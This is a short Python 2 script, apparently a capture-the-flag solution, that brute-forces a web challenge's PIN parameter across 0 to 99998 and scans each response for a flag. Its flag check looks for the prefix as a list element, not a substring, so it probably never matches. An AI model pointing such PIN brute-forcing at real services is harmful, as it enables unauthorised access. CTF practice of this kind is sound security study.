import urllib2
import re

for x in range(0, 99999):
    url = "https://ctf.sucurihc.org/flag/eua/web50/?pin="+str(x)
    #conteudo = urllib2.url_open(url)

    print "[DEBUG] >>> Opening URL %s" % url
    conteudo = urllib2.urlopen(url).read()
    result = re.findall("<center>(.*?)</center>", conteudo)

    if "SHC{" in result:

        print "[DEBUG] >>> Flag: %s" % result
